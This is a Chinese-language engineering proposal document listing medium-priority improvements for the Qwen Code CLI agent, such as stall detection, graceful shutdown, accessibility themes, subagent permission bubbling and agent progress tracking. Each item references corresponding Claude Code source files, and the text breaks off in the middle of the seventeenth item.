# Qwen Code 改进建议 — P2 稳定性、安全与 CI/CD

> 中等优先级改进项。每项包含：问题场景、现状分析、改进前后对比、实现成本评估、Claude Code 源码索引、Qwen Code 修改方向。
>
> 返回 [改进建议总览](./qwen-code-improvement-report.md)

---

<a id="item-1"></a>

### 1. Bash 交互提示卡顿检测（P2）

你让 Agent 执行 `npm install`，它触发了一个 `Do you want to continue? (y/n)` 交互式提示。Agent 在等待 shell 退出，shell 在等待用户输入——但你根本不知道有这个提示，因为 Agent 没有任何通知机制。结果就是任务永久挂起，你以为 Agent 还在工作。解决思路是后台每 5 秒检查 shell 输出增长，45 秒内无新输出时读取最后 1024 字节检测交互式提示模式（`(y/n)`、`Press Enter`、`password:` 等 regex），检测到后立即通知用户。

**Qwen Code 现状**：shell 工具执行后仅等待退出码，无输出监控——任何交互式提示都会导致无限等待。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `tasks/LocalShellTask/LocalShellTask.tsx` (L24-100) | `STALL_CHECK_INTERVAL_MS = 5s`、`STALL_THRESHOLD_MS = 45s`、`STALL_TAIL_BYTES = 1024` |
| `tasks/LocalShellTask/LocalShellTask.tsx` (L32-38) | `looksLikePrompt()` regex 匹配交互式提示 |

**Qwen Code 修改方向**：shell 工具执行后仅等待退出码，无输出监控。改进方向：① 后台 5s 轮询 shell 输出文件大小；② 45s 无增长时读取尾部匹配 prompt 模式；③ 检测到交互提示后通知用户（`stdin` 需要输入或 kill 进程）。

**实现成本评估**：
- 涉及文件：~2 个
- 新增代码：~100 行
- 开发周期：~1 天（1 人）
- 难点：prompt regex 模式覆盖率——既要检测常见提示又要避免误报

**改进前后对比**：
- **改进前**：`npm install` 弹出交互提示 → Agent 永远等待 → 用户不知道发生了什么 → 任务永久挂起
- **改进后**：45s 无输出增长 → 自动检测交互提示 → 用户收到通知 → 手动输入或终止进程

**意义**：`npm install` 弹出 `Do you want to continue? (y/n)` 导致 Agent 永远等待。
**缺失后果**：交互式 prompt 卡住 = 任务永久挂起——用户不知道在等什么。
**改进收益**：45s 检测 + 自动通知——用户立即知道需要手动输入或终止。

---

<a id="item-2"></a>

### 2. TTY orphan process检测（P2）

你通过 SSH 连接远程服务器使用 Agent，网络中断后 SSH 会话断开。但 Agent 进程并不知道终端已关闭——macOS 终端关闭有时不发 SIGHUP 信号——于是进程变成孤儿，持续消耗 CPU 和内存直到被手动 kill。解决思路是每 30 秒检查 TTY 是否仍可读，`process.stdin` 变为不可读时说明终端已关闭，触发优雅退出。

**Qwen Code 现状**：无 TTY 存活检测——终端关闭后进程变成孤儿（消耗 CPU/内存直到被 kill）。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `utils/gracefulShutdown.ts` (L278-296) | 30s 定时器检查 TTY 有效性、检测到 revoked TTY 时 `gracefulShutdown(0)` |

**Qwen Code 修改方向**：无 TTY 存活检测——终端关闭后进程变成孤儿（消耗 CPU/内存直到被 kill）。改进方向：① `setInterval(30000)` 检查 `process.stdin.isTTY`；② TTY 不可读时触发优雅关闭；③ timer 标记 `.unref()` 不阻止进程退出。

**实现成本评估**：
- 涉及文件：~1 个
- 新增代码：~30 行
- 开发周期：~0.5 天（1 人）
- 难点：不同操作系统 TTY 行为差异（macOS vs Linux）

**改进前后对比**：
- **改进前**：终端关闭或 SSH 断开 → 进程变孤儿 → 持续消耗 CPU/内存 → 需手动 `kill`
- **改进后**：30s 定时检查 TTY → 检测到终端失效 → 自动优雅退出 → 资源自动释放

**意义**：终端窗口意外关闭（或 SSH 断开）后进程应自动退出而非变成僵尸。
**缺失后果**：终端关闭 → 进程变孤儿 → 消耗资源直到手动 kill。
**改进收益**：30s 检测 → 自动退出——无orphan process，资源自动释放。

---

<a id="item-3"></a>

### 3. MCP 服务器优雅关闭升级（P2）

你的 MCP 服务器正在写入数据库，Agent 退出时直接断开 transport 连接——服务器来不及提交事务，数据库锁未释放，下次启动时出现锁冲突。问题在于没有给服务器优雅退出的机会。解决思路是 3 阶段升级关闭——100ms 发 SIGINT（给服务器处理清理的机会）→ 400ms 无响应发 SIGTERM → 500ms+ 仍存活发 SIGKILL。总超时 600ms，通过 `process.kill(pid, 0)` 检测进程是否存活。

**Qwen Code 现状**：`McpClient.disconnect()` 直接关闭 transport，无信号升级——MCP 服务器无法执行清理逻辑。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `services/mcp/client.ts` (L1425-1560) | 3 阶段升级：SIGINT(100ms) → SIGTERM(400ms) → SIGKILL(500ms+) |

**Qwen Code 修改方向**：`McpClient.disconnect()` 直接关闭 transport，无信号升级。改进方向：① stdio 服务器关闭时先发 SIGINT；② 100ms 后检查存活，未退出则 SIGTERM；③ 400ms 后仍存活则 SIGKILL；④ 每阶段检查 `kill(pid, 0)` 确认进程状态。

**实现成本评估**：
- 涉及文件：~1 个
- 新增代码：~60 行
- 开发周期：~1 天（1 人）
- 难点：跨平台信号处理差异（Windows 无 SIGINT/SIGTERM）

**改进前后对比**：
- **改进前**：Agent 退出 → 直接断开 transport → 服务器来不及清理 → 临时文件残留 / 数据库锁未释放
- **改进后**：Agent 退出 → SIGINT(100ms) → SIGTERM(400ms) → SIGKILL(600ms) → 服务器有机会优雅退出

**意义**：MCP 服务器可能有待保存的状态——直接 kill 可能导致数据损坏。
**缺失后果**：直接断开 → 服务器无法清理 → 临时文件残留 / 数据库锁未释放。
**改进收益**：3 阶段升级——给服务器 100ms 优雅退出的机会，最坏 600ms 强制结束。

---

<a id="item-4"></a>

### 4. 事件循环卡顿检测（P2）

你在使用 Agent 时突然发现键盘输入没有响应，UI 完全冻结了几秒——你以为程序崩溃了。实际上是 Node.js 主线程被同步 I/O 或大量 JSON 解析阻塞了。但你无法知道到底是什么阻塞了主线程，因为没有任何诊断信息。解决思路是定时器检测主线程阻塞超过 500ms 的情况，记录诊断日志（时间戳、阻塞时长、调用栈），帮助定位性能热点。

**Qwen Code 现状**：无事件循环监控——主线程阻塞时无任何诊断信息，无法定位卡顿原因。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `utils/eventLoopStallDetector.js` | 主线程阻塞 >500ms 时记录日志 |
| `main.tsx` (L427-429) | feature gate 动态导入（仅内部用户启用） |

**Qwen Code 修改方向**：无事件循环监控。改进方向：① 新建 `utils/eventLoopMonitor.ts`——`setInterval` 检测实际间隔与预期间隔的偏差；② 偏差 >500ms 时记录 warning + 当前执行上下文；③ 开发模式下默认启用，生产模式可通过环境变量启用。

**实现成本评估**：
- 涉及文件：~2 个
- 新增代码：~80 行
- 开发周期：~1 天（1 人）
- 难点：检测逻辑本身不能成为性能瓶颈

**改进前后对比**：
- **改进前**：UI 冻结 3 秒 → 用户以为程序崩溃 → 无诊断信息 → 无法定位原因
- **改进后**：UI 冻结 500ms+ → 自动记录阻塞时长和上下文 → 开发者精确定位同步 I/O 热点

**意义**：主线程阻塞 = UI 冻结 + 键盘无响应——用户以为程序崩溃了。
**缺失后果**：无诊断信息——"为什么卡了？" 无法定位。
**改进收益**：自动检测 + 诊断日志——快速定位同步 I/O 和 CPU 热点。

---

<a id="item-5"></a>

### 5. 会话活动心跳与空闲检测（P2）

你通过 SDK 在远程环境运行 Agent，Agent 正在执行一个耗时 5 分钟的工具调用。期间没有任何 API 请求发送，远程服务端认为连接空闲超时，断开了会话——工具执行完成后结果无处回传，任务失败。解决思路是基于引用计数的活动追踪——API 调用和工具执行 `start()/stop()` 维护 refcount，refcount > 0 时每 30 秒发送心跳保持远程会话存活，refcount = 0 后启动空闲计时器自动退出释放资源。

**Qwen Code 现状**：无会话活动追踪——远程 MCP 连接可能因空闲超时断开，长时间工具执行期间无心跳保持连接。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `utils/sessionActivity.ts` | `startSessionActivity(reason)`、`stopSessionActivity(reason)`、`SESSION_ACTIVITY_INTERVAL_MS = 30s` |
| `utils/idleTimeout.ts` (54行) | `CLAUDE_CODE_EXIT_AFTER_STOP_DELAY` 空闲退出 |

**Qwen Code 修改方向**：无会话活动追踪——远程 MCP 连接可能因空闲超时断开。改进方向：① 新建 `utils/sessionActivity.ts`——refcount 追踪 API 调用和工具执行；② refcount > 0 时 30s 心跳（向远程端点发送 keepalive）；③ 可配置空闲超时——SDK/daemon 模式下空闲 N 秒后自动退出释放资源。

**实现成本评估**：
- 涉及文件：~3 个
- 新增代码：~150 行
- 开发周期：~2 天（1 人）
- 难点：refcount 泄漏防护——确保每个 start() 都有对应的 stop()

**改进前后对比**：
- **改进前**：工具执行 5 分钟 → 无心跳发送 → 远程连接超时断开 → 结果无法回传 → 任务失败
- **改进后**：工具执行期间 30s 心跳 → 连接始终存活 → 空闲时自动退出释放资源

**意义**：后台/远程会话可能因空闲被服务端断开——心跳保持连接存活。
**缺失后果**：长工具执行期间无心跳 → 远程连接超时 → 结果无法回传。
**改进收益**：30s 心跳 = 连接始终存活；空闲检测 = 资源自动释放。

---

<a id="item-6"></a>

### 6. Markdown 渲染缓存与纯文本快速路径（P2）

你在 Agent 中滚动回看 100 条历史消息，发现滚动明显卡顿。原因是每次渲染都重新解析 markdown——正则 + 递归的解析开销大，但大部分消息在滚动/重绘时内容不变，完全可以缓存。解决思路是 500 条 LRU 缓存存储解析后的 token 树（命中时零解析开销），加上纯文本快速检测（无 `#`/`*`/`` ` ``/`|` 等标记时直接跳过解析器）。

**Qwen Code 现状**：`MarkdownDisplay.tsx` 每次渲染重新解析 markdown，无缓存——滚动历史消息时 CPU 浪费导致卡顿。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `components/Markdown.tsx` | 500-item LRU token cache、`marked` 库解析 |
| `utils/markdown.ts` | 纯文本快速检测（fast path for plain text） |

**Qwen Code 修改方向**：`MarkdownDisplay.tsx` 每次渲染重新解析 markdown。改进方向：① 新增 `markdownCache: LRUCache<string, Token[]>(500)`；② 渲染前检查缓存命中；③ 纯文本快速路径——无 markdown 标记时直接渲染 `<Text>`。

**实现成本评估**：
- 涉及文件：~2 个
- 新增代码：~60 行
- 开发周期：~1 天（1 人）
- 难点：缓存失效策略——内容变化时确保缓存正确更新

**改进前后对比**：
- **改进前**：滚动 100 条消息 → 每帧重新解析 markdown → CPU 密集 → 滚动卡顿
- **改进后**：LRU 缓存命中 = 0ms 解析 + 纯文本快速路径跳过 90% 简单消息 → 滚动流畅

**意义**：滚动回看历史消息时每帧重新解析 markdown——CPU 浪费导致卡顿。
**缺失后果**：100 条消息的历史 × 每帧解析 = 滚动卡顿。
**改进收益**：缓存命中 = 0ms 解析；纯文本快速路径 = 跳过 90% 的简单消息。

---

<a id="item-7"></a>

### 7. OSC 8 终端超链接（P2）

Agent 输出了大量文件路径（如 `src/utils/foo.ts:42`），你需要打开这些文件——但路径只是纯文本，你只能手动复制路径然后在 IDE 中打开。现代终端（iTerm2、WezTerm、Ghostty、kitty）都支持 OSC 8 超链接协议，可以让文件路径变成可点击链接——Cmd+Click 直接在 IDE 中打开。解决思路是文件路径和 URL 渲染为 OSC 8 超链接格式 `\e]8;;file:///path\e\\text\e]8;;\e\\`，并检测终端是否支持 OSC 8。

**Qwen Code 现状**：文件路径作为纯文本输出，不可点击——用户需手动复制路径再打开。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `ink/termio/osc.ts` | OSC 8 超链接序列生成 |
| `ink/components/Text.tsx` | `hyperlink` 属性渲染 OSC 8 |
| `ink/output.ts` | `HyperlinkPool` 超链接池化 + 去重 |

**Qwen Code 修改方向**：文件路径作为纯文本输出，不可点击。改进方向：① 检测终端 OSC 8 支持（通过 `$TERM_PROGRAM`）；② 文件路径渲染时包裹 OSC 8 序列；③ URL 自动检测并包裹超链接。

**实现成本评估**：
- 涉及文件：~3 个
- 新增代码：~120 行
- 开发周期：~1 天（1 人）
- 难点：终端兼容性检测——不支持 OSC 8 的终端会显示乱码转义序列

**改进前后对比**：
- **改进前**：`src/utils/foo.ts:42` 是纯文本 → 手动复制路径 → 在 IDE 中打开 → 导航效率低
- **改进后**：`src/utils/foo.ts:42` 是可点击链接 → Cmd+Click 直接在 IDE 打开 → 导航效率提升 10×

**意义**：Agent 输出大量文件路径——点击直接跳转 vs 手动复制粘贴。
**缺失后果**：`src/utils/foo.ts:42` 只是文本——需手动复制路径再打开。
**改进收益**：Cmd+Click 直接在 IDE 打开——文件导航效率提升 10×。

---

<a id="item-8"></a>

### 8. 模糊搜索选择器（FuzzyPicker）（P2）

你有 50+ 个会话历史，想找到上周那个关于"数据库迁移"的会话——但列表没有搜索功能，只能逐项滚动。模糊搜索组件在所有列表场景（会话选择、文件选择、命令选择、MCP 工具选择）都能大幅提升效率。解决思路是通用模糊搜索组件——输入过滤 + 键盘导航（方向键上下选择、Tab/Shift+Tab）+ 异步预览加载 + 滚动指示器（↑↓），预览面板支持 bottom 和 right 两种布局。

**Qwen Code 现状**：`RadioButtonSelect.tsx` 和 `BaseSelectionList.tsx` 提供基础列表选择，但无模糊搜索过滤——用户只能逐项滚动浏览。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `components/design-system/FuzzyPicker.tsx` | 通用模糊搜索、异步预览、方向键导航、滚动指示器 |
| `components/HistorySearchDialog.tsx` | 会话搜索 + 预览（时间戳、首行、年龄格式化） |
| `utils/highlightMatch.tsx` | 匹配字符高亮渲染 |

**Qwen Code 修改方向**：`RadioButtonSelect.tsx` 和 `BaseSelectionList.tsx` 提供基础列表选择，但无模糊搜索过滤。改进方向：① 新建 `FuzzyPicker.tsx`——输入框 + 过滤列表 + 预览面板；② 集成 fzf-like 模糊匹配算法；③ 匹配字符高亮渲染。

**实现成本评估**：
- 涉及文件：~3 个
- 新增代码：~300 行
- 开发周期：~3 天（1 人）
- 难点：模糊匹配算法的排序质量——确保最相关结果排在前面

**改进前后对比**：
- **改进前**：50+ 会话历史 → 逐项滚动查找 → 找到目标需 30 秒+
- **改进后**：输入 2-3 个字符 → 即时过滤到目标 → 找到目标需 3 秒

**意义**：50+ 会话历史需要快速搜索定位——逐个浏览效率极低。
**缺失后果**：无搜索过滤的列表 = 用户只能逐项滚动。
**改进收益**：输入 2-3 个字符即过滤到目标——搜索效率提升 10×。

---

<a id="item-9"></a>

### 9. 统一设计系统组件库（P2）

你在开发新功能时需要一个带边框的容器组件——但项目中没有统一的 UI 原语，每个组件自行管理颜色和边框样式，导致风格不一致和大量重复代码。解决思路是 12 个语义化 UI 原语组成设计系统——ThemedBox（主题感知边框）、ThemedText（语义颜色文本）、StatusIcon（✓✗⚠ℹ○ 状态图标）、Divider（带标题分割线）、ListItem（焦点/选中态列表项）、Pane（容器组件）、ProgressBar（Unicode 块字符进度条 ▏▎▍▌▋▊▉█）、LoadingState（spinner + 消息 + 副标题）。所有组件通过 ThemeProvider 统一主题。

**Qwen Code 现状**：UI 组件分散在 `components/` 各处，无统一设计系统——每个组件自行管理颜色/边框样式，风格不一致 + 重复代码。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `components/design-system/` | 12 个设计系统组件 |
| `components/design-system/ThemeProvider.tsx` | React Context 主题管理 |
| `components/design-system/StatusIcon.tsx` | 5 种状态图标 + 颜色映射 |
| `components/design-system/ProgressBar.tsx` | Unicode 块字符精确进度条 |

**Qwen Code 修改方向**：UI 组件分散在 `components/` 各处，无统一设计系统。改进方向：① 新建 `components/design-system/` 目录；② 抽取通用 UI 原语（ThemedBox、StatusIcon、Divider、ProgressBar 等）；③ 通过 ThemeProvider 统一注入主题色。

**实现成本评估**：
- 涉及文件：~15 个
- 新增代码：~600 行
- 开发周期：~5 天（1 人）
- 难点：从现有分散组件中抽取通用逻辑，不破坏现有 UI

**改进前后对比**：
- **改进前**：新功能需要带边框容器 → 自行实现颜色/边框 → 风格与其他组件不一致 → 重复代码
- **改进后**：新功能直接使用 `<ThemedBox>` → 自动继承主题色 → UI 风格全局一致 → 零重复

**意义**：统一设计系统 = UI 一致性 + 新功能开发效率。
**缺失后果**：每个组件自行管理颜色/边框样式——不一致 + 重复代码。
**改进收益**：12 个语义原语 = 新功能直接组合，UI 风格自动一致。

---

<a id="item-10"></a>

### 10. Markdown 表格终端渲染（P2）

Agent 输出一个中英文混合的对比表格，但在终端中列对齐完全错乱——中文字符占 2 列宽度，ANSI 颜色转义序列被计入宽度，导致表格变成不可读的乱码。解决思路是 ANSI-aware 列宽计算（颜色转义不占宽度）+ CJK 字符 2 列宽度处理 + 自动换行 + 对齐标记支持（左/右/居中）。

**Qwen Code 现状**：[PR#2914](https://github.com/QwenLM/qwen-code/pull/2914) 已合并，重写了 `TableRenderer`，修复了 CJK/ANSI 列宽问题。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `components/MarkdownTable.tsx` | HTML table → 终端渲染、cell 换行、列宽计算 |

**Qwen Code 修改方向**：`MarkdownDisplay.tsx` 的表格渲染在 CJK/ANSI 混合场景列对齐不准确。改进方向：① 列宽计算使用 `stringWidth()`（ANSI-aware + CJK 2-width）；② cell 内容超宽时自动换行而非截断；③ 支持对齐标记（`:---`/`:---:`/`---:`）。

**实现成本评估**：
- 涉及文件：~2 个
- 新增代码：~150 行
- 开发周期：~2 天（1 人）
- 难点：ANSI 转义序列解析——需正确处理嵌套颜色和重置序列

**改进前后对比**：
- **改进前**：中英文混合表格 → ANSI 颜色被计入宽度 + CJK 字符宽度错误 → 列错位 → 表格不可读
- **改进后**：`stringWidth()` 精确计算 → ANSI-aware + CJK 2-width → 任何语言下表格都对齐

**进展**：[PR#2914](https://github.com/QwenLM/qwen-code/pull/2914) ✓ 已合并 — 重写 `TableRenderer` 为单字符串块渲染，修复 CJK/ANSI 列宽、长内容换行、对齐标记支持。

**意义**：Agent 输出对比表格是核心展示方式——对齐错误 = 信息不可读。
**缺失后果**：CJK + ANSI 颜色混合时列错位——表格变成乱码。
**改进收益**：ANSI-aware + CJK-aware 列宽 = 表格在任何语言下都对齐。

---

<a id="item-11"></a>

### 11. 屏幕阅读器无障碍支持（P2）

视障开发者使用屏幕阅读器与 Agent 交互时，听到的是 "dots dots dots"（spinner 动画）而非 "正在处理"，diff 的颜色信息也完全丢失。动画和颜色对屏幕阅读器用户来说是噪音而非信息。解决思路是检测环境变量启用无障碍模式——禁用动画（spinner 改为静态文本）、Diff 渲染为纯文本格式、进度信息以文本而非进度条显示、颜色信息附带文字标签。

**Qwen Code 现状**：`useIsScreenReaderEnabled()` hook 已存在但使用有限——大部分组件没有无障碍替代渲染。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| 多个组件 | `isScreenReaderActive` 条件渲染——Diff/Spinner/Progress 均有无障碍替代 |

**Qwen Code 修改方向**：`useIsScreenReaderEnabled()` hook 已存在但使用有限。改进方向：① Diff 组件添加屏幕阅读器替代渲染（纯文本模式）；② Spinner 改为 `"Processing..."` 静态文本；③ ProgressBar 改为 `"45% complete"` 文本；④ `NoColor` 主题作为无障碍默认。

**实现成本评估**：
- 涉及文件：~6 个
- 新增代码：~100 行
- 开发周期：~2 天（1 人）
- 难点：测试验证——需要实际使用屏幕阅读器确认交互体验

**改进前后对比**：
- **改进前**：屏幕阅读器读出 "dots dots dots" → 用户不知道 Agent 在做什么 → diff 颜色信息完全丢失
- **改进后**：屏幕阅读器读出 "Processing..." → 进度显示 "45% complete" → 所有信息以文本呈现

**意义**：视障开发者依赖屏幕阅读器——动画和颜色对他们是噪音。
**缺失后果**：屏幕阅读器读出 "dots dots dots" 而非 "正在处理"。
**改进收益**：无障碍模式 = 所有信息以文本呈现——屏幕阅读器完美工作。

---

<a id="item-12"></a>

### 12. 色觉无障碍主题（Daltonized）（P2）

你的团队中有一位红绿色盲开发者（男性发病率 8%），他使用 Agent 审查 diff 时完全看不出删除行（红色）和新增行（绿色）的区别——两种颜色在他眼中看起来几乎一样。解决思路是提供 `light-daltonized` 和 `dark-daltonized` 两个专用主题，diff 颜色从红/绿改为蓝/橙，所有语义颜色（success/error/warning）使用色觉安全色板。

**Qwen Code 现状**：15 个主题中无色觉无障碍主题——红绿色盲用户无法区分 diff 的删除和新增。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `utils/theme.ts` | `light-daltonized`、`dark-daltonized` 主题定义 |

**Qwen Code 修改方向**：15 个主题中无色觉无障碍主题。改进方向：① 新增 `qwen-daltonized-dark` 和 `qwen-daltonized-light` 主题；② Diff 颜色从红/绿改为蓝/橙；③ 所有语义颜色（success/error/warning）使用色觉安全色板。

**实现成本评估**：
- 涉及文件：~1 个
- 新增代码：~80 行
- 开发周期：~1 天（1 人）
- 难点：色觉安全色板的选择——需参考 colorbrewer 等权威色板方案

**改进前后对比**：
- **改进前**：红色删除行 + 绿色新增行 → 红绿色盲用户看到相同颜色 → 无法区分变更
- **改进后**：蓝色删除行 + 橙色新增行 → 所有用户都能清晰区分 → 100% 用户可用

**意义**：8% 男性用户有色觉障碍——红绿 diff 对他们看不出区别。
**缺失后果**：红色删除和绿色新增 = 对色觉障碍用户完全相同。
**改进收益**：蓝/橙 diff = 100% 用户可区分。

---

<a id="item-13"></a>

### 13. 动画系统与卡顿状态检测（P2）

你看到 Agent 的 spinner 已经转了 60 秒——不知道是正常工作中还是卡住了。spinner 永远是蓝色的，没有任何视觉反馈告诉你"这可能有问题"。解决思路是统一动画框架——`useAnimationFrame(intervalMs)` 以 60fps 驱动所有动画，共享时钟（ClockContext）确保多个动画同步。关键改进是卡顿检测：spinner 超过阈值时间（如 30s）自动从蓝色 shimmer 渐变为红色，提示用户可能需要干预。

**Qwen Code 现状**：`GeminiRespondingSpinner.tsx` 使用 `ink-spinner` 库的固定动画，无超时状态检测——spinner 永远蓝色，用户无法判断是否卡住。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `components/Spinner/useShimmerAnimation.ts` | shimmer 微光效果（glimmer index 计算） |
| `components/Spinner/useStalledAnimation.ts` | 超时后颜色渐变为红色 |
| `ink/hooks/use-animation-frame.ts` | `useAnimationFrame(intervalMs)` 统一动画驱动 |

**Qwen Code 修改方向**：`GeminiRespondingSpinner.tsx` 使用 `ink-spinner` 库的固定动画，无超时状态检测。改进方向：① spinner 超过 30s 时颜色渐变为黄色/红色提示可能卡住；② shimmer 微光效果替代单调转圈；③ 共享动画时钟确保多组件同步。

**实现成本评估**：
- 涉及文件：~3 个
- 新增代码：~150 行
- 开发周期：~2 天（1 人）
- 难点：颜色渐变动画的平滑过渡——避免突变带来的视觉跳跃

**改进前后对比**：
- **改进前**：spinner 转了 60 秒 → 永远蓝色 → 用户无法判断正常还是卡住 → 白白等待
- **改进后**：spinner 30s 后渐变为红色 → 用户立即知道可能需要干预 → Escape 或继续等待

**意义**：用户看到同一个 spinner 转 60 秒——不知道是正常还是卡住了。
**缺失后果**：spinner 永远蓝色 = "还在正常工作？还是卡住了？" 无法判断。
**改进收益**：30s 后变红 = 用户立即知道可能需要干预（Escape 或等待）。

---

<a id="item-14"></a>

### 14. Agent 权限冒泡与审批路由（P2）

你启动了一个后台 Subagent 执行文件写入操作，Subagent 需要用户审批权限——但它运行在后台，没有自己的终端 UI。权限请求被静默阻塞，你不知道 Subagent 在等你审批，Subagent 也无法继续工作。解决思路是权限冒泡机制——Fork Subagent 的 `permissionMode: 'bubble'` 将权限请求上浮到父级终端，Leader 通过 `leaderPermissionBridge` 桥接 InProcess Teammate 的权限请求到 Leader 的 `ToolUseConfirm` 对话框。桥接不可用时通过文件邮箱异步审批。

**Qwen Code 现状**：Subagent继承父级 ApprovalMode，但无冒泡机制——后台代理的权限请求无处显示，导致静默阻塞。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `utils/swarm/permissionSync.ts` (928行) | `createPermissionRequest()`、`sendPermissionRequestViaMailbox()` |
| `utils/swarm/leaderPermissionBridge.ts` (54行) | Leader ToolUseConfirm 队列桥接 |
| `tools/AgentTool/forkSubagent.ts` (L60) | `permissionMode: 'bubble'` |

**Qwen Code 修改方向**：Subagent继承父级 ApprovalMode，但无冒泡机制——后台代理的权限请求无处显示。改进方向：① 新增 `bubble` 权限模式——Subagent请求路由到父级 UI；② Leader 桥接——Teammate 权限请求显示在 Leader 终端；③ 文件邮箱回退——tmux 代理通过 JSON 文件异步审批。

**实现成本评估**：
- 涉及文件：~4 个
- 新增代码：~300 行
- 开发周期：~4 天（1 人）
- 难点：跨进程权限请求的同步——确保请求不丢失、审批结果正确回传

**改进前后对比**：
- **改进前**：后台 Subagent 需要权限 → 无处显示审批对话框 → 静默阻塞 → 用户不知道在等什么
- **改进后**：后台 Subagent 需要权限 → 请求冒泡到父终端 → 用户审批 → Subagent 继续执行

**进展**：[PR#2886](https://github.com/QwenLM/qwen-code/pull/2886)（Agent Team 实验性功能）

**意义**：后台代理需要权限审批但没有自己的终端——请求必须路由到用户可见处。
**缺失后果**：后台 Agent 权限请求 = 静默阻塞——用户不知道在等什么。
**改进收益**：权限冒泡 = 请求自动出现在父终端——用户审批后代理继续。

---

<a id="item-15"></a>

### 15. Agent 专属 MCP 服务器（P2）

你创建了一个"Slack 通知代理"和一个"数据库迁移代理"——两个代理都能看到所有 MCP 工具（Slack + DB + 文件系统 + ...），工具列表过长浪费 token，而且权限过宽。解决思路是代理 frontmatter 配置 `mcpServers` 字段——字符串引用（如 `"slack"`）复用已连接的服务器，内联定义创建新连接。代理启动时连接，退出时自动清理。安全策略区分 plugin/built-in 代理和用户自定义代理。

**Qwen Code 现状**：代理共享全局 MCP 配置，无 per-agent MCP——所有代理看到所有工具，权限过宽 + 工具列表过长浪费 token。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `tools/AgentTool/runAgent.ts` (L95) | `initializeAgentMcpServers()` 连接 Agent 专属 MCP |
| `tools/AgentTool/loadAgentsDir.ts` (L87) | frontmatter `mcpServers` 字段 |

**Qwen Code 修改方向**：代理共享全局 MCP 配置，无 per-agent MCP。改进方向：① frontmatter 新增 `mcpServers` 字段；② 字符串引用复用已连接服务器（`connectToServer = memoize()` 已支持）；③ 内联定义在代理启动时 `connect()`、退出时 `disconnect()`；④ 安全策略区分 admin-trusted 和 user-controlled 代理。

**实现成本评估**：
- 涉及文件：~3 个
- 新增代码：~200 行
- 开发周期：~3 天（1 人）
- 难点：MCP 服务器生命周期管理——代理异常退出时确保连接正确清理

**改进前后对比**：
- **改进前**：Slack 代理看到 DB/文件系统/所有 MCP 工具 → 权限过宽 → 工具列表过长浪费 token
- **改进后**：Slack 代理只看到 Slack MCP → 精准工具集 → 安全隔离 → token 节省

**意义**：专业代理需要专属工具——Slack 代理需要 Slack MCP，数据库代理需要 DB MCP。
**缺失后果**：所有代理共享全部 MCP = 权限过宽 + 工具列表过长浪费 token。
**改进收益**：per-agent MCP = 精准工具集 + 安全隔离 + 启动时按需连接。

---

<a id="item-16"></a>

### 16. Agent 创建向导（P2）

你想创建一个自定义代理，但代理定义涉及 10+ 配置项（位置、类型、系统提示、工具子集、模型、记忆范围等）——手动编辑 YAML frontmatter 容易写错格式，导致代理加载失败。解决思路是多步骤交互式向导引导创建——选择位置（User/Project）→ 选择方式（手动/AI 生成）→ 设定类型名 → 编写系统提示 → 选择工具子集 → 选择模型 → 配置记忆范围 → 确认并保存为 `.claude/agents/name.md`。

**Qwen Code 现状**：`/agents create` 命令存在但交互流程简单——无多步向导，用户需了解完整配置格式才能创建可用代理。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `components/agents/new-agent-creation/CreateAgentWizard.tsx` | 11 步向导（Location→Method→Type→Prompt→Tools→Model→Color→Memory→Confirm） |
| `components/agents/agentFileUtils.ts` | `saveAgentToFile()`、`formatAgentAsMarkdown()` |

**Qwen Code 修改方向**：`/agents create` 命令存在但交互流程简单。改进方向：① 多步向导 UI（Ink 组件）引导每个配置项；② 工具选择提供可勾选列表（而非手动输入名称）；③ AI 生成模式——描述需求后 AI 生成 system prompt；④ 保存前预览完整的 YAML frontmatter + markdown。

**实现成本评估**：
- 涉及文件：~4 个
- 新增代码：~500 行
- 开发周期：~4 天（1 人）
- 难点：向导各步骤的数据校验和回退逻辑——用户可能想修改前面的步骤

**改进前后对比**：
- **改进前**：手动编辑 YAML frontmatter → 格式错误 → 代理加载失败 → 反复调试配置
- **改进后**：向导引导每步配置 → 保存前预览 → 3 分钟创建完整代理定义 → 零格式错误

**意义**：代理定义涉及 10+ 配置项——无向导引导容易遗漏或出错。
**缺失后果**：用户手动编辑 YAML frontmatter——格式错误 = 代理加载失败。
**改进收益**：向导引导 = 3 分钟创建完整代理定义——零格式错误。

---

<a id="item-17"></a>

### 17. Agent 进度追踪与实时状态（P2）

你启动了 5 个后台代理并行处理任务——但它们都是黑箱。你不知道每个代理做到了哪步、用了多少 token、是否卡住了。只有等代理全部完成后才能看到最终结果。解决思路是 `ProgressTracker` 追踪每个后台代理的实时状态——toolUseCount、tokenCount（input/output）、recentActivities（最近 5 条操作描述），通过 `<task-notification>` XML 格式向 Coordinator 报告完成状态，UI 组件 `BackgroundTasksDialog` 展示所有后台代理列表 + 进度 + kill 控制。

**Qwen Code 现状**：`AgentResultDisplay` 提供最终结果但无实时进度追踪——后台代理运行期间是黑箱。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `tasks/LocalAgentTask/LocalAgentTask.tsx` | `ProgressTracker`、`registerAsyncAgent()`、`updateAsyncAgentProgress()` |
| `utils/sdkEventQueue.ts` | `<task-notification>` XML 格式 |
| `components/tasks/BackgroundTasksDialog.tsx` | 后台代理 UI 列表 + kill 控制 |

